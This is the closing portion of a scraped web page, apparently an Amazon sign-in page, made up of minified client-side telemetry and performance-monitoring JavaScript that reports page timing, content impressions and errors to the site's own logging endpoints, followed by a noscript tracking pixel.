!b||0>=b.length?h(!1):l()}else h(!1)}var e=a.ue_ext||{};a.ue_ext||c();return e}function q(){setTimeout(c,r)}var s=a.ue_dserr||!1,p=!0,n=1,r=2E3,g=0;a.ue_err&&s&&(a.ue_err.errorHandlers||(a.ue_err.errorHandlers=[]),a.ue_err.errorHandlers.push({name:"ext",handler:function(a){if(!a.logLevel||"FATAL"===a.logLevel){var f=c(!0),d=[],h;for(h in f){var f=h,g=f.match(/amazon(\.com?)?\.\w{2,3}$/i);g&&1<g.length||-1!==f.indexOf("amazon-adsystem.com")||-1!==f.indexOf("amazonpay.com")||-1!==f.indexOf("cloudfront-labs.amazonaws.com")||
d.push(h)}a.ext=d}}}));a.ue&&a.ue.isl?c():a.ue&&ue.attach&&ue.attach("load",q)})(document,window);





var ue_wtc_c = 3;
ue_csm.ue.exec(function(b,e){function l(){for(var a=0;a<f.length;a++)a:for(var d=s.replace(A,f[a])+g[f[a]]+t,c=arguments,b=0;b<c.length;b++)try{c[b].send(d);break a}catch(e){}g={};f=[];n=0;k=p}function u(){B?l(q):l(C,q)}function v(a,m,c){r++;if(r>w)d.count&&1==r-w&&(d.count("WeblabTriggerThresholdReached",1),b.ue_int&&console.error("Number of max call reached. Data will no longer be send"));else{var h=c||{};h&&-1<h.constructor.toString().indexOf(D)&&a&&-1<a.constructor.toString().indexOf(x)&&m&&-1<
m.constructor.toString().indexOf(x)?(h=b.ue_id,c&&c.rid&&(h=c.rid),c=h,a=encodeURIComponent(",wl="+a+"/"+m),2E3>a.length+p?(2E3<k+a.length&&u(),void 0===g[c]&&(g[c]="",f.push(c)),g[c]+=a,k+=a.length,n||(n=e.setTimeout(u,E))):b.ue_int&&console.error("Invalid API call. The input provided is over 2000 chars.")):d.count&&(d.count("WeblabTriggerImproperAPICall",1),b.ue_int&&console.error("Invalid API call. The input provided does not match the API protocol i.e ue.trigger(String, String, Object)."))}}function F(){d.trigger&&
d.trigger.isStub&&d.trigger.replay(function(a){v.apply(this,a)})}function y(){z||(f.length&&l(q),z=!0)}var t=":1234",s="//"+b.ue_furl+"/1/remote-weblab-triggers/1/OE/"+b.ue_mid+":"+b.ue_sid+":PLCHLDR_RID$s:wl-client-id%3DCSMTriger",A="PLCHLDR_RID",E=b.wtt||1E4,p=s.length+t.length,w=b.mwtc||2E3,G=1===e.ue_wtc_c,B=3===e.ue_wtc_c,H=e.XMLHttpRequest&&"withCredentials"in new e.XMLHttpRequest,x="String",D="Object",d=b.ue,g={},f=[],k=p,n,z=!1,r=0,C=function(){return{send:function(a){if(H){var b=new e.XMLHttpRequest;
b.open("GET",a,!0);G&&(b.withCredentials=!0);b.send()}else throw"";}}}(),q=function(){return{send:function(a){(new Image).src=a}}}();e.encodeURIComponent&&(d.attach&&(d.attach("beforeunload",y),d.attach("pagehide",y)),F(),d.trigger=v)},"client-wbl-trg")(ue_csm,window);


(function(k,d,h){function f(a,c,b){a&&a.indexOf&&0===a.indexOf("http")&&0!==a.indexOf("https")&&l(s,c,a,b)}function g(a,c,b){a&&a.indexOf&&(location.href.split("#")[0]!=a&&null!==a&&"undefined"!==typeof a||l(t,c,a,b))}function l(a,c,b,e){m[b]||(e=u&&e?n(e):"N/A",d.ueLogError&&d.ueLogError({message:a+c+" : "+b,logLevel:v,stack:"N/A"},{attribution:e}),m[b]=1,p++)}function e(a,c){if(a&&c)for(var b=0;b<a.length;b++)try{c(a[b])}catch(d){}}function q(){return d.performance&&d.performance.getEntriesByType?
d.performance.getEntriesByType("resource"):[]}function n(a){if(a.id)return"//*[@id='"+a.id+"']";var c;c=1;var b;for(b=a.previousSibling;b;b=b.previousSibling)b.nodeName==a.nodeName&&(c+=1);b=a.nodeName;1!=c&&(b+="["+c+"]");a.parentNode&&(b=n(a.parentNode)+"/"+b);return b}function w(){var a=h.images;a&&a.length&&e(a,function(a){var b=a.getAttribute("src");f(b,"img",a);g(b,"img",a)})}function x(){var a=h.scripts;a&&a.length&&e(a,function(a){var b=a.getAttribute("src");f(b,"script",a);g(b,"script",a)})}
function y(){var a=h.styleSheets;a&&a.length&&e(a,function(a){if(a=a.ownerNode){var b=a.getAttribute("href");f(b,"style",a);g(b,"style",a)}})}function z(){if(A){var a=q();e(a,function(a){f(a.name,a.initiatorType)})}}function B(){e(q(),function(a){g(a.name,a.initiatorType)})}function r(){var a;a=d.location&&d.location.protocol?d.location.protocol:void 0;"https:"==a&&(z(),w(),x(),y(),B(),p<C&&setTimeout(r,D))}var s="[CSM] Insecure content detected ",t="[CSM] Ajax request to same page detected ",v="WARN",
m={},p=0,D=k.ue_nsip||1E3,C=5,A=1==k.ue_urt,u=!0;ue_csm.ue_disableNonSecure||(d.performance&&d.performance.setResourceTimingBufferSize&&d.performance.setResourceTimingBufferSize(300),r())})(ue_csm,window,document);


var ue_aa_a = "";
if (ue.trigger && (ue_aa_a === "C" || ue_aa_a === "T1")) {
    ue.trigger("UEDATA_AA_SERVERSIDE_ASSIGNMENT_CLIENTSIDE_TRIGGER_190249", ue_aa_a);
}
(function(f,b){function g(){try{b.PerformanceObserver&&"function"===typeof b.PerformanceObserver&&(a=new b.PerformanceObserver(function(b){c(b.getEntries())}),a.observe(d))}catch(h){k()}}function m(){for(var h=d.entryTypes,a=0;a<h.length;a++)c(b.performance.getEntriesByType(h[a]))}function c(a){if(a&&Array.isArray(a)){for(var c=0,e=0;e<a.length;e++){var d=l.indexOf(a[e].name);if(-1!==d){var g=Math.round(b.performance.timing.navigationStart+a[e].startTime);f.uet(n[d],void 0,void 0,g);c++}}l.length===
c&&k()}}function k(){a&&a.disconnect&&"function"===typeof a.disconnect&&a.disconnect()}if("function"===typeof f.uet&&b.performance&&"object"===typeof b.performance&&b.performance.getEntriesByType&&"function"===typeof b.performance.getEntriesByType&&b.performance.timing&&"object"===typeof b.performance.timing&&"number"===typeof b.performance.timing.navigationStart){var d={entryTypes:["paint"]},l=["first-paint","first-contentful-paint"],n=["fp","fcp"],a;try{m(),g()}catch(p){f.ueLogError(p,{logLevel:"ERROR",
attribution:"performanceMetrics"})}}})(ue_csm,window);


if (window.csa) {
    csa("Events")("setEntity", {
        page:{pageType: "AuthenticationPortal", subPageType: "SignInPwdCollect", pageTypeId: ""}
    });
}
csa.plugin(function(e){var i="transitionStart",n="pageVisible",t="PageTiming",a="visibilitychange",o=e("Events",{producerId:"csa"}),r=(e.global.performance||{}).timing,d=["navigationStart","unloadEventStart","unloadEventEnd","redirectStart","redirectEnd","fetchStart","domainLookupStart","domainLookupEnd","connectStart","connectEnd","secureConnectionStart","requestStart","responseStart","responseEnd","domLoading","domInteractive","domContentLoadedEventStart","domContentLoadedEventEnd","domComplete","loadEventStart","loadEventEnd"],c=e.config,s=e.global.document||{},l=(r||{}).navigationStart,u=l,m={},v=0,g=0,f=c[t+".BatchInterval"]||3e3,p=0,S=!0;if(!c["KillSwitch."+t]){if(!r||null===l||l<=0||void 0===l)return e.error("Invalid navigation timing data: "+l);("boolean"==typeof s.hidden||"string"==typeof s.visibilityState)&&s.addEventListener&&s.removeEventListener&&((S=L())?(E(n,l),b()):s.addEventListener(a,function t(){(S=L())&&(u=e.time(),s.removeEventListener(a,t),E(n,u),E(i,u),b())})),e.once("$unload",h),e.once("$load",h),e.on("$beforePageTransition",y),e.on("$pageTransition",function(){u=e.time()}),e.register(t,{mark:E})}function E(t,n){null!=t&&(n=n||e.time(),t===i&&(u=n),m[t]=n,b(),e.emit("$timing:"+t,n))}function h(){!function(){if(p)return;for(var t=0;t<d.length;t++)r[d[t]]&&E(d[t],r[d[t]]);p=1}(),v=1,b(!0)}function b(t){v&&S&&!g&&(g=setTimeout(y,t?0:f))}function y(){0<Object.keys(m).length&&(o("log",{markers:function(t,n){var e={};for(var i in t)t.hasOwnProperty(i)&&(e[i]=Math.max(0,t[i]-n));return e}(m,u),markerTimestamps:function(t){for(var n in t)t.hasOwnProperty(n)&&(t[n]=Math.floor(t[n]));return t}(m),navigationStartTimestamp:u?new Date(u).toISOString():null,schemaId:"<ns>.PageLatency.5"},{ent:{page:["pageType","subPageType","requestId"]}}),m={}),g=0}function L(){return!s.hidden||"visible"===s.visibilityState}});csa.plugin(function(e){var m=!!e.config["LCP.elementDedup"],t=!1,n=e("PageTiming"),r=e.global.PerformanceObserver,a=e.global.performance;if(r&&a&&a.timing){var i=e.exec(function(){t||function(o){var l=new r(function(e){var t=e.getEntries();if(0!==t.length){var n=t[t.length-1];if(m&&""!==n.id&&n.element&&"IMG"===n.element.tagName){for(var r={},a=t[0],i=0;i<t.length;i++)t[i].id in r||(""!==t[i].id&&(r[t[i].id]=!0),a.startTime<t[i].startTime&&(a=t[i]));n=a}l.disconnect(),o({startTime:n.startTime,renderTime:n.renderTime,loadTime:n.loadTime})}});try{l.observe({type:"largest-contentful-paint",buffered:!0})}catch(e){}}(function(e){e&&(t=!0,n("mark","largestContentfulPaint",Math.floor(e.startTime+o())),e.renderTime&&n("mark","largestContentfulPaint.render",Math.floor(e.renderTime+o())),e.loadTime&&n("mark","largestContentfulPaint.load",Math.floor(e.loadTime+o())))})});e.once("$unload",i),e.once("$load",i),e.register("LargestContentfulPaint",{})}function o(){return a.timing.navigationStart}});csa.plugin(function(r){var e=r("Metrics",{producerId:"csa"}),n=r.global.PerformanceObserver;n&&(n=new n(function(r){var t=r.getEntries();if(0===t.length||!t[0].processingStart||!t[0].startTime)return;!function(r){r=r||0,n.disconnect(),0<=r?e("recordMetric","firstInputDelay",r):e("recordMetric","firstInputDelay.invalid",1)}(t[0].processingStart-t[0].startTime)}),function(){try{n.observe({type:"first-input",buffered:!0})}catch(r){}}())});csa.plugin(function(d){var e="Metrics",r=d.config,u=r[e+".BatchInterval"]||3e3;function n(e){var r=e.producerId,n=e.logger,t=n||d("Events",{producerId:r}),i={},o=(e||{}).dimensions||{},c=0;if(!r&&!n)return d.error("Either a producer id or custom logger must be defined");function s(){Object.keys(i).length&&(t("log",{schemaId:e.schemaId||"<ns>.Metric.3",metrics:i,dimensions:o},e.logOptions||{ent:{page:["pageType","subPageType","requestId"]}}),i={}),c=0}this.recordMetric=function(e,r){i[e]=r,c=c||setTimeout(s,u)},d.on("$beforeunload",s),d.on("$beforePageTransition",s)}r["KillSwitch."+e]||(new n({producerId:"csa"}).recordMetric("baselineMetricEvent",1),d.register(e,{instance:function(e){return new n(e||{})}}))});csa.plugin(function(c){var e="Timers",r=(c.global.performance||{}).timing,s=(r||{}).navigationStart||c.time(),u=c.config[e+".BatchInterval"]||3e3;function n(e){var r=(e=e||{}).producerId,n=e.logger,o={},t=0,i=n||c("Events",{producerId:r});if(!r&&!n)return c.error("Either a producer id or custom logger must be defined");function a(){0<Object.keys(o).length&&(i("log",{markers:o,schemaId:e.schemaId||"<ns>.Timer.1"},e.logOptions),o={}),clearTimeout(t),t=0}this.mark=function(e,r){o[e]=(void 0===r?c.time():r)-s,t=t||setTimeout(a,u)},c.once("$beforeunload",a),c.once("$beforePageTransition",a)}r&&c.register(e,{instance:function(e){return new n(e||{})}})});csa.plugin(function(t){var e="takeRecords",i="disconnect",n="function",o="addEventListener",c="removeEventListener",a="click",r=t("Metrics",{producerId:"csa"}),u=t("PageTiming"),f=t.global,m=f.PerformanceObserver,s=0,l=!1,d=0,v=f.performance,h=f.document,y=null,g=!1;if(m&&v&&v.timing&&h){m=new m(function(t){y&&clearTimeout(y);t.getEntries().forEach(function(t){t.hadRecentInput||(s+=t.value,d<t.startTime&&(d=t.startTime))}),y=setTimeout(T,5e3)}),function(){try{m.observe({type:"layout-shift",buffered:!0}),y=setTimeout(T,5e3)}catch(t){}}();var p=t.exec(T);h[o](a,function t(e){g||(g=!0,r("recordMetric","documentCumulativeLayoutShiftToFirstInput",s),h[c](a,t))}),h[o]("visibilitychange",function(){"hidden"===h.visibilityState&&p()}),t.once("$unload",p)}function T(){l||(l=!0,clearTimeout(y),typeof m[e]===n&&m[e](),typeof m[i]===n&&m[i](),r("recordMetric","documentCumulativeLayoutShift",s),u("mark","cumulativeLayoutShiftLastTimestamp",Math.floor(d+v.timing.navigationStart)))}});csa.plugin(function(e){var n=e.global,r=n.PerformanceObserver,t=e("Metrics",{producerId:"csa"}),o=0,c=0,i=-1,a=n.Math,l=a.max,f=a.ceil;function u(){t("recordMetric","totalBlockingTime",f(c||0)),t("recordMetric","totalBlockingTimeInclLCP",f(o||0)),t("recordMetric","maxBlockingTime",f(i||0)),c=o=0,i=-1}r&&(new r(e.exec(function(e){e.getEntries().forEach(function(e){var n=e.duration;o+=n,c+=n,i=l(n,i)})})).observe({type:"longtask",buffered:!0}),new r(e.exec(function(e){0<e.getEntries().length&&(c=0,i=-1)})).observe({type:"largest-contentful-paint",buffered:!0}),e.on("$unload",u),e.on("$beforePageTransition",u))});csa.plugin(function(r){var e="CacheDetection",o="csa-ctoken-",n=r.store,t=r.deleteStored,c=r.config,a=c[e+".RequestID"],s=c[e+".Callback"],i=r.global,u=i.document||{},d=i.Date,f=r("Events"),l=r("Events",{producerId:"csa"});function p(e){try{var n=u.cookie.match(RegExp("(^| )"+e+"=([^;]+)"));return n&&n[2].trim()}catch(e){}}!function(){var e=function(){var e=p("cdn-rid");if(e)return{r:e,s:"cdn"}}()||function(){if(r.store(o+a))return{r:r.UUID().toUpperCase().replace(/-/g,"").slice(0,20),s:"device"}}()||{},n=e.r,c=e.s;if(!!n){var t=p("session-id");!function(e,n,c){f("setEntity",{page:{pageSource:"cache",requestId:e,cacheRequestId:a},session:{id:c}}),l("log",{schemaId:"<ns>.CacheImpression.1"},{ent:"all"})}(n,0,t),s&&s(n,t,c)}}(),n(o+a,d.now()+36e5),r.once("$load",r.exec(function(){var c=d.now();t(function(e,n){return 0==e.indexOf(o)&&parseInt(n)<c})}))});csa.plugin(function(c){var i,t="Content",e="MutationObserver",n="requestAnimationFrame",r="addedNodes",u="querySelectorAll",a="matches",o="getAttributeNames",s="getAttribute",f="dataset",l="widget",d="producerId",h={ent:{element:1,page:["pageType","subPageType","requestId"]}},m=5,g=c.config[t+".BubbleUp.SearchDepth"]||10,p="csaC",v=p+"Id",y={},b=c.config,E=b[t+".Selectors"]||[],I=b[t+".WhitelistedAttributes"]||{href:1,class:1},w=b[t+".EnableContentEntities"],A=c.global,C=A.document||{},U=C.documentElement,k=A.HTMLElement,L={},N=[],O=function(t,e,n,i){var r=this,o=c("Events",{producerId:t||"csa"});e.type=e.type||l,r.id=e.id,r.l=o,r.e=e,r.el=n,r.rt=i,r.dlo=h,r.log=function(t,e){o("log",t,e||h)},e.id&&o("setEntity",{element:e})},q=O.prototype;function D(t){var e=(t=t||{}).element,n=t.target;return e?function(t,e){var n;n=t instanceof k?B(t)||$(e[d],t,F,c.time()):L[t.id]||_(e[d],0,t,c.time());return n}(e,t):n?function(t){var e,n=function(t){var e=null,n=0;for(;t&&n<g;){if(n++,S(t,v)){e=t;break}t=t.parentElement}return e}(t);e=n?B(n):new O("csa",{id:null},null,c.time());return e}(n):c.error("No element or target argument provided.")}function S(t,e){if(t&&t.dataset)return t.dataset[e]}function T(t,e,n){N.push({n:n,e:t,t:e}),x()}function j(){for(var t=c.time(),e=0;0<N.length;){var n=N.shift();if(y[n.n](n.e,n.t),++e%10==0&&c.time()-t>m)break}i=0,N.length&&x()}function x(){i=i||A[n](j)}function M(t,e,n){return{n:t,e:e,t:n}}function $(t,e,n,i){var r=c.UUID(),o={id:r};return e[f][v]=r,n(o,e),_(t,e,o,i)}function _(t,e,n,i){w&&(n.schemaId="<ns>.ContentEntity.2"),n.id=n.id||c.UUID();var r=new O(t,n,e,i);return w&&r.log({schemaId:"<ns>.ContentRender.1",timestamp:i}),c.emit("$content.register",r),L[n.id]=r}function B(t){return L[(t[f]||{})[v]]}function F(t,e){o in e&&(function(n,i){Object.keys(n[f]).forEach(function(t){if(!t.indexOf(p)&&p.length<t.length){var e=function(t){return(t[0]||"").toLowerCase()+t.slice(1)}(t.slice(p.length));i[e]=n[f][t]}})}(e,t),function(e,n){(e[o]()||[]).forEach(function(t){t in I&&(n[t]=e[s](t))})}(e,t))}U&&A[n]&&C[u]&&A[e]&&(E.push({selector:"*[data-csa-c-type]",entity:F}),E.push({selector:".celwidget",entity:function(t,e){F(t,e),t.slotId=t.slotId||e[s]("cel_widget_id")||e.id,t.type=t.type||l}}),y[1]=function(t,e){t.forEach(function(t){t[r]&&t[r].constructor&&"NodeList"===t[r].constructor.name&&Array.prototype.forEach.call(t[r],function(t){N.unshift(M(2,t,e))})})},y[2]=function(o,c){u in o&&a in o&&E.forEach(function(t){var e=t.selector,n=o[a](e),i=o[u](e);n&&N.unshift(M(3,{e:o,s:t},c));for(var r=0;r<i.length;r++)N.unshift(M(3,{e:i[r],s:t},c))})},y[3]=function(t,e){var n=t.e;B(n)||$("csa",n,t.s.entity,e)},y[4]=function(){c.register(t,{instance:D})},new A[e](function(t){T(t,c.time(),1)}).observe(U,{childList:!0,subtree:!0}),T(U,c.time(),2),T(null,c.time(),4),c.on("$content.export",function(e){Object.keys(e).forEach(function(t){q[t]=e[t]})}))});csa.plugin(function(n){var i,t="ContentImpressions",e="KillSwitch.",o="IntersectionObserver",r="getAttribute",s="dataset",c="intersectionRatio",a="csaCId",m=1e3,l=n.global,f=n.config,u=f[e+t],g=f[e+t+".ContentViews"],v=((l.performance||{}).timing||{}).navigationStart||n.time(),d={};function h(t){t&&(t.v=1,function(t){t.vt=n.time(),t.el.log({schemaId:"<ns>.ContentView.2",timeToViewed:t.vt-t.el.rt,pageFirstPaintToElementViewed:t.vt-v})}(t))}function I(t){t&&!t.it&&(t.i=n.time()-t.is>m,function(t){t.it=n.time(),t.el.log({schemaId:"<ns>.ContentImpressed.2",timeToImpressed:t.it-t.el.rt,pageFirstPaintToElementImpressed:t.it-v})}(t))}!u&&l[o]&&(i=new l[o](function(t){t.forEach(function(t){var e=function(t){if(t&&t[r])return d[t[s][a]]}(t.target);if(e){var i=t.intersectionRect;t.isIntersecting&&0<i.width&&0<i.height&&(g||e.v||h(e),.5<=t[c]&&!e.is&&(e.is=n.time(),e.timer=l.setTimeout(function(){I(e)},m))),t[c]<.5&&!e.it&&e.timer&&(l.clearTimeout(e.timer),e.is=0,e.timer=0)}})},{threshold:[0,.5]}),n.on("$content.register",function(t){var e=t.el;e&&(d[t.id]={el:t,v:0,i:0,is:0,vt:0,it:0},i.observe(e))}))});csa.plugin(function(e){e.config["KillSwitch.ContentLatency"]||e.emit("$content.export",{mark:function(t,n){var o=this;o.t||(o.t=e("Timers",{logger:o.l,schemaId:"<ns>.ContentLatency.1",logOptions:o.dlo})),o.t("mark",t,n)}})});csa.plugin(function(o){var t,i="normal",s="reload",n="history",d="new-tab",e="ajax",a=1,r=2,c="lastActive",u="lastInteraction",l="used",g="csa-tabbed-browsing",p="visibilityState",f={"back-memory-cache":1,"tab-switch":1,"history-navigation-page-cache":1},v="<ns>.TabbedBrowsing.2",b="visible",m=o.global,y=o("Events",{producerId:"csa"}),h=m.location,I=m.document,T=m.JSON,w=((m.performance||{}).navigation||{}).type,L=o.store,z=o.storageSupport(),C=!1,E={},P={},S={},k={},A=!1,R=!1,U=!1;function $(i){try{return T.parse(L(g,void 0,{session:i})||"{}")||{}}catch(i){o.error('Could not parse storage value for key "'+g+'": '+i)}return{}}function j(i,t){L(g,T.stringify(t||{}),{session:i})}function q(i){var t=P.tid||i.id,n=E[c]||{};n.tid===t&&(n.pid=i.id),k={pid:i.id,tid:t,lastInteraction:P[u]||{},initialized:!0},S={lastActive:n,lastInteraction:E[u]||{},time:o.time()}}function x(i){var t=i===d,n=I.referrer,e=!(n&&n.length)||function(t){try{return t&&t.length?new URL(t).origin:null}catch(i){o.error('Could not parse URL "'+t+'" while getting origin:'+i)}return null}(n)!==h.origin,a=t&&e,r={type:i,toTabId:k.tid,toPageId:k.pid,transitTime:o.time()-E.time||null};a||function(i,t,n){var e=i===s,a=t?E[c]||{}:P,r=E[u]||{},o=P[u]||{},d=t?r:o;n.fromTabId=a.tid,n.fromPageId=a.pid,e||!d.id||d[l]||(n.interactionId=d.id||null,r.id===d.id&&(r[l]=!0),o.id===d.id&&(o[l]=!0))}(i,t,r),y("log",{navigation:r,schemaId:v},{ent:{page:["pageType","subPageType","requestId"]}})}function B(i){U=function(i){return i&&i in f}(i.transitionType),function(){E=$(!1),P=$(!0);var i=E[u],t=P[u],n=!1,e=!1;i&&t&&i.id===t.id&&i[l]!==t[l]&&(n=!i[l],e=!t[l],t[l]=i[l]=!0,n&&j(!1,E),e&&j(!0,P))}(),q(i),A=!0,function(i){var t,n;t=N(),n=O(),(t||n)&&q(i)}(i)}function J(){C&&!U?x(e):(C=!0,x(w===r||U?n:w===a?P.initialized?s:d:P.initialized?i:d))}function N(){return!(!A||!t)&&(P[u]={id:t.messageId,used:!(E[u]={id:t.messageId,used:!1})},!(t=null))}function O(){var i=!1;R=I[p]===b,A&&(i=function(i,t){var n=!1,e=i[c];return R?e&&e.tid===k.tid&&e[b]&&e.pid===t||(i[c]={visible:!0,pid:t,tid:P.tid||k.tid},n=!0):e&&e.tid===k.tid&&e[b]&&(n=!(e[b]=!1)),n}(E,P.pid||k.pid));return i}z.local&&z.session&&T&&I&&I.addEventListener&&p in I&&(o.on("$pageChange",function(i){B(i),J(),j(!1,S),j(!0,k),P=k,E=S},{buffered:1}),o.on("$content.interaction",function(i){t=i,N()&&(j(!1,E),j(!0,P))}),I.addEventListener("visibilitychange",function(){O()&&j(!1,E)},{capture:!1,passive:!0}))});csa.plugin(function(e){var c=e.global.addEventListener,r=e("Metrics",{producerId:"csa"});c&&c("pageshow",function(e){e&&e.persisted&&r("recordMetric","bfCache",1)})});


}
/* ◬ */
</script>

</div>

<noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:136-0636727-0142044:GD8BTMZD2D0V8PWFQSXE$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3DGD8BTMZD2D0V8PWFQSXE:0' alt=""/>
</noscript>


<div id="a-popover-root" style="z-index:-1;position:absolute;"></div></body></html>